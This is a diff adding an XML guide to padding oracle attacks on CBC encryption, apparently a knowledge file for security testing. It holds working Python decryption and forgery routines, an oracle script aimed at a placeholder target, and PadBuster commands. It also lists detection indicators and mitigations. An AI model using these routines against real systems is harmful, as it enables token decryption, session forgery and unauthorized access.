@@ -1,0 +1,262 @@
+<vulnerability_guide>
+  <title>PADDING ORACLE ATTACKS - CBC MODE EXPLOITATION</title>
+
+  <critical>Padding oracle attacks exploit error messages or timing differences when decrypting CBC-mode ciphertext with invalid padding. By observing whether decryption succeeds or fails, attackers can decrypt ciphertext without the key. This vulnerability has been found in TLS (POODLE, Lucky13), ASP.NET, Java applications, and numerous cryptographic implementations.</critical>
+
+  <scope>
+    - CBC mode block cipher implementations
+    - APIs returning different errors for padding vs other failures
+    - Timing differences in cryptographic operations
+    - Session tokens and encrypted cookies
+    - Encrypted parameters in URLs or forms
+    - TLS/SSL implementations (older versions)
+  </scope>
+
+  <methodology>
+    1. **Identify encrypted data**: Find CBC-encrypted tokens, cookies, or parameters
+    2. **Detect oracle**: Test for different responses to valid vs invalid padding
+    3. **Confirm vulnerability**: Verify consistent oracle behavior
+    4. **Decrypt ciphertext**: Use oracle to recover plaintext block by block
+    5. **Forge ciphertext**: Create valid ciphertext for arbitrary plaintext
+  </methodology>
+
+  <advanced_techniques>
+    <oracle_detection>
+      Identify padding oracle behavior:
+      {% raw %}
+      # Error message oracle
+      # Valid padding: "Success" or normal response
+      # Invalid padding: "Padding error" or HTTP 500
+
+      # Test by modifying last byte of ciphertext
+      # Original: encrypted_token=ABC123...XYZ
+      # Modified: encrypted_token=ABC123...XYa (change last byte)
+
+      # Expected behavior patterns:
+      # - HTTP 200 vs 500 (status code)
+      # - "Decryption failed" vs "Invalid data" (error messages)
+      # - Fast response vs slow response (timing)
+      # - Different response lengths
+
+      # Response analysis
+      for i in range(256):
+          modified = ciphertext[:-1] + bytes([i])
+          response = send_request(modified)
+          if is_different(response, baseline_error):
+              print(f"Byte {i}: Potential valid padding")
+
+      # Timing oracle (more subtle)
+      import time
+      for i in range(256):
+          modified = ciphertext[:-1] + bytes([i])
+          start = time.time()
+          send_request(modified)
+          elapsed = time.time() - start
+          if elapsed > threshold:
+              print(f"Byte {i}: Timing difference detected")
+      {% endraw %}
+    </oracle_detection>
+
+    <padding_scheme_identification>
+      Identify padding scheme in use:
+      {% raw %}
+      # PKCS#7 (most common)
+      # Last N bytes are all set to value N
+      # Block size 16: [data...]\x04\x04\x04\x04
+      # Block size 8: [data...]\x03\x03\x03
+
+      # ISO/IEC 7816-4
+      # \x80 followed by zero bytes
+      # [data...]\x80\x00\x00\x00
+
+      # ANSI X.923
+      # Zero bytes followed by length
+      # [data...]\x00\x00\x00\x04
+
+      # Zero padding
+      # Just zeros appended
+      # [data...]\x00\x00\x00\x00
+
+      # Determine block size
+      # CBC ciphertext length is always multiple of block size
+      # Common: 8 (DES, 3DES), 16 (AES)
+      block_size = gcd(len(sample1), len(sample2), len(sample3))
+      {% endraw %}
+    </padding_scheme_identification>
+
+    <decryption_attack>
+      Decrypt ciphertext using padding oracle:
+      {% raw %}
+      # Decrypting last block (PKCS#7, 16-byte blocks)
+      # C = IV || C1 || C2 (3 blocks)
+      # To decrypt C2, we manipulate C1
+
+      # Step 1: Find byte that produces valid \x01 padding
+      for guess in range(256):
+          modified_c1 = C1[:-1] + bytes([C1[-1] ^ guess])
+          # If valid, guess ^ plaintext_byte = 0x01
+          # So plaintext_byte = guess ^ 0x01
+
+      # Step 2: Find bytes for \x02\x02 padding
+      # Set last byte to produce \x02, then bruteforce second-to-last
+
+      # Full decryption algorithm
+      def decrypt_block(ciphertext, previous_block, oracle):
+          plaintext = b''
+          intermediate = b''
+
+          for position in range(15, -1, -1):  # 15 to 0
+              padding_value = 16 - position
+
+              for guess in range(256):
+                  # Build modified block
+                  modified = bytearray(16)
+                  modified[position] = guess
+
+                  # Set already-known bytes to produce correct padding
+                  for i in range(position + 1, 16):
+                      modified[i] = intermediate[i] ^ padding_value
+
+                  if oracle(bytes(modified) + ciphertext):
+                      intermediate_byte = guess ^ padding_value
+                      intermediate = bytes([intermediate_byte]) + intermediate
+                      plaintext_byte = intermediate_byte ^ previous_block[position]
+                      plaintext = bytes([plaintext_byte]) + plaintext
+                      break
+
+          return plaintext
+      {% endraw %}
+    </decryption_attack>
+
+    <ciphertext_forgery>
+      Create valid ciphertext for arbitrary plaintext:
+      {% raw %}
+      # Once you can decrypt, you can encrypt by working backwards
+
+      # To encrypt arbitrary plaintext P:
+      # 1. Choose random final ciphertext block C_n
+      # 2. Use oracle to find intermediate value I_n
+      # 3. Calculate C_{n-1} = P_n XOR I_n
+      # 4. Repeat for all blocks
+
+      def forge_ciphertext(plaintext, oracle, block_size=16):
+          # Pad plaintext
+          padded = pkcs7_pad(plaintext, block_size)
+          blocks = [padded[i:i+block_size] for i in range(0, len(padded), block_size)]
+
+          # Start with random final block
+          ciphertext = [os.urandom(block_size)]
+
+          for plain_block in reversed(blocks):
+              # Find intermediate values using oracle
+              intermediate = decrypt_block(ciphertext[0], bytes(16), oracle)
+              # XOR with plaintext to get required previous ciphertext
+              prev_cipher = bytes([p ^ i for p, i in zip(plain_block, intermediate)])
+              ciphertext.insert(0, prev_cipher)
+
+          return b''.join(ciphertext)
+      {% endraw %}
+    </ciphertext_forgery>
+
+    <web_application_attacks>
+      Exploit padding oracles in web apps:
+      {% raw %}
+      # ASP.NET padding oracle (CVE-2010-3332)
+      # Encrypted ViewState vulnerable to padding oracle
+      # Different error pages for padding vs MAC failure
+
+      # Tool: PadBuster
+      padbuster http://target/page.aspx ENCRYPTED_VALUE 16 -encoding 0
+
+      # Tool: Padding Oracle Attacker
+      padre --url http://target/page.aspx --cookie "token=ENCRYPTED"
+
+      # Encrypted cookies
+      # Original: auth=BASE64_ENCRYPTED
+      # Attack: Modify to decrypt/forge session tokens
+
+      # URL parameters
+      # http://target/view?data=ENCRYPTED_HEX
+      # Modify 'data' to decrypt contents
+
+      # Custom script example
+      import requests
+      import base64
+
+      def oracle(ciphertext):
+          data = base64.b64encode(ciphertext).decode()
+          response = requests.get(f'http://target/page?token={data}')
+          # True if padding valid, False otherwise
+          return 'padding' not in response.text.lower()
+      {% endraw %}
+    </web_application_attacks>
+
+    <timing_attack_variant>
+      Exploit timing-based padding oracles:
+      {% raw %}
+      # Lucky13 attack concept
+      # MAC-then-encrypt in TLS
+      # Different padding lengths = different processing times
+
+      # Timing measurement
+      import statistics
+
+      def measure_timing(ciphertext, iterations=100):
+          times = []
+          for _ in range(iterations):
+              start = time.perf_counter()
+              send_request(ciphertext)
+              elapsed = time.perf_counter() - start
+              times.append(elapsed)
+          return statistics.median(times)
+
+      # Compare timing for different byte values
+      timings = {}
+      for byte_value in range(256):
+          modified = ciphertext[:-1] + bytes([byte_value])
+          timings[byte_value] = measure_timing(modified)
+
+      # Byte with significantly different timing indicates padding boundary
+      valid_padding_byte = max(timings.keys(), key=lambda k: timings[k])
+
+      # Mitigation: Constant-time comparison
+      # Always process same number of bytes regardless of padding
+      {% endraw %}
+    </timing_attack_variant>
+  </advanced_techniques>
+
+  <validation>
+    - Confirm padding oracle by observing different responses
+    - Decrypt at least one block of ciphertext
+    - Document oracle behavior (error messages, timing, status codes)
+    - Forge valid ciphertext for controlled plaintext (if practical)
+    - Identify the cryptographic implementation affected
+  </validation>
+
+  <false_positives>
+    - Error differences due to non-padding issues (network, application logic)
+    - Random timing variations below attack threshold
+    - Application-level validation before decryption (catches before padding check)
+    - Authenticated encryption modes (GCM, CCM) - not vulnerable to padding oracle
+  </false_positives>
+
+  <detection_indicators>
+    - Many requests with slightly modified encrypted values
+    - Sequential byte value testing patterns
+    - Unusually high error rates for specific parameters
+    - Repeated requests to same endpoint with modified cookies/tokens
+  </detection_indicators>
+
+  <pro_tips>
+    - CBC mode without authentication is the root cause - recommend GCM/CCM
+    - Network jitter can mask timing oracles - use statistical analysis
+    - PadBuster is the standard tool for exploitation
+    - Some implementations validate MAC before decryption (encrypt-then-MAC) - secure
+    - Look for base64 or hex-encoded blobs that are multiples of 8 or 16 bytes
+    - ASP.NET ViewState and encrypted cookies are common targets
+    - POODLE requires SSL 3.0 downgrade - check TLS version
+    - Timing oracles need many samples to reduce noise
+  </pro_tips>
+
+  <remember>Padding oracle attacks demonstrate why encrypt-then-MAC or authenticated encryption (AEAD) should always be used. The attack is practical and tools exist to automate exploitation against vulnerable systems.</remember>
+</vulnerability_guide>
